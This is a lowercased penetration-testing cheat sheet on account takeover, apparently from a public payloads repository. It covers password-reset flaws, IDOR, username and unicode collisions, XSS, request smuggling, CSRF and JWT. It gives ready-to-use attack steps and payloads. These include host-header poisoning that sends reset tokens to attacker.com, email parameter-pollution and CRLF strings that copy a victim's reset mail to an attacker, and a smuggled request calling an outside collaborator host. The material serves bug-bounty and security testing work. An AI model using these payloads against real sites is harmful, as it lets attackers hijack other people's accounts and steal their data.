# account takeover

> account takeover (ato) is a significant threat in the cybersecurity landscape, involving unauthorized access to users' accounts through various attack vectors.

## summary

* [password reset feature](#password-reset-feature)
    * [password reset token leak via referrer](#password-reset-token-leak-via-referrer)
    * [account takeover through password reset poisoning](#account-takeover-through-password-reset-poisoning)
    * [password reset via email parameter](#password-reset-via-email-parameter)
    * [idor on api parameters](#idor-on-api-parameters)
    * [weak password reset token](#weak-password-reset-token)
    * [leaking password reset token](#leaking-password-reset-token)
    * [password reset via username collision](#password-reset-via-username-collision)
    * [account takeover due to unicode normalization issue](#account-takeover-due-to-unicode-normalization-issue)
* [account takeover via web vulneralities](#account-takeover-via-web-vulneralities)
    * [account takeover via cross site scripting](#account-takeover-via-cross-site-scripting)
    * [account takeover via http request smuggling](#account-takeover-via-http-request-smuggling)
    * [account takeover via csrf](#account-takeover-via-csrf)
* [references](#references)

## password reset feature

### password reset token leak via referrer

1. request password reset to your email address
2. click on the password reset link
3. don't change password
4. click any 3rd party websites(eg: facebook, twitter)
5. intercept the request in burp suite proxy
6. check if the referer header is leaking password reset token.

### account takeover through password reset poisoning

1. intercept the password reset request in burp suite
2. add or edit the following headers in burp suite : `host: attacker.com`, `x-forwarded-host: attacker.com`
3. forward the request with the modified header

    ```http
    post https://example.com/reset.php http/1.1
    accept: */*
    content-type: application/json
    host: attacker.com
    ```

4. look for a password reset url based on the *host header* like : `https://attacker.com/reset-password.php?token=token`

### password reset via email parameter

```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0a%0dcc:hacker@mail.com
email=victim@mail.com%0a%0dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### idor on api parameters

1. attacker have to login with their account and go to the **change password** feature.
2. start the burp suite and intercept the request
3. send it to the repeater tab and edit the parameters : user id/email

    ```powershell
    post /api/changepass
    [...]
    ("form": {"email":"victim@email.com","password":"securepwd"})
    ```

### weak password reset token

the password reset token should be randomly generated and unique every time.
try to determine if the token expire or if it's always the same, in some cases the generation algorithm is weak and can be guessed. the following variables might be used by the algorithm.

* timestamp
* userid
* email of user
* firstname and lastname
* date of birth
* cryptography
* number only
* small token sequence (<6 characters between [a-z,a-z,0-9])
* token reuse
* token expiration date

### leaking password reset token

1. trigger a password reset request using the api/ui for a specific email e.g: <test@mail.com>
2. inspect the server response and check for `resettoken`
3. then use the token in an url like `https://example.com/v3/user/password/reset?resettoken=[the_reset_token]&email=[the_mail]`

### password reset via username collision

1. register on the system with a username identical to the victim's username, but with white spaces inserted before and/or after the username. e.g: `"admin "`
2. request a password reset with your malicious username.
3. use the token sent to your email and reset the victim password.
4. connect to the victim account with the new password.

the platform ctfd was vulnerable to this attack.
see: [cve-2020-7245](https://nvd.nist.gov/vuln/detail/cve-2020-7245)

### account takeover due to unicode normalization issue

when processing user input involving unicode for case mapping or normalisation, unexcepted behavior can occur.  

* victim account: `demo@gmail.com`
* attacker account: `demⓞ@gmail.com`

[unisub - is a tool that can suggest potential unicode characters that may be converted to a given character](https://github.com/tomnomnom/hacks/tree/master/unisub).

[unicode pentester cheatsheet](https://gosecure.github.io/unicode-pentester-cheatsheet/) can be used to find list of suitable unicode characters based on platform.

## account takeover via web vulneralities

### account takeover via cross site scripting

1. find an xss inside the application or a subdomain if the cookies are scoped to the parent domain : `*.domain.com`
2. leak the current **sessions cookie**
3. authenticate as the user using the cookie

### account takeover via http request smuggling

refer to **http request smuggling** vulnerability page.

1. use **smuggler** to detect the type of http request smuggling (cl, te, cl.te)

    ```powershell
    git clone https://github.com/defparam/smuggler.git
    cd smuggler
    python3 smuggler.py -h
    ```

2. craft a request which will overwrite the `post / http/1.1` with the following data:

    ```powershell
    get http://something.burpcollaborator.net  http/1.1
    x: 
    ```

3. final request could look like the following

    ```powershell
    get /  http/1.1
    transfer-encoding: chunked
    host: something.com
    user-agent: smuggler/v1.0
    content-length: 83

    0

    get http://something.burpcollaborator.net  http/1.1
    x: x
    ```

hackerone reports exploiting this bug

* <https://hackerone.com/reports/737140>
* <https://hackerone.com/reports/771666>

### account takeover via csrf

1. create a payload for the csrf, e.g: "html form with auto submit for a password change"
2. send the payload

### account takeover via jwt

json web token might be used to authenticate an user.

* edit the jwt with another user id / email
* check for weak jwt signature

## references

* [$6,5k + $5k http request smuggling mass account takeover - slack + zomato - bug bounty reports explained - august 30, 2020](https://www.youtube.com/watch?v=gzm4wwa7rfo)
* [10 password reset flaws - anugrah sr - september 16, 2020](https://anugrahsr.github.io/posts/10-password-reset-flaws/)
* [broken cryptography & account takeovers - harsh bothra - september 20, 2020](https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)
* [ctfd account takeover - nist national vulnerability database - march 29, 2020](https://nvd.nist.gov/vuln/detail/cve-2020-7245)
* [hacking grindr accounts with copy and paste - troy hunt - october 3, 2020](https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)
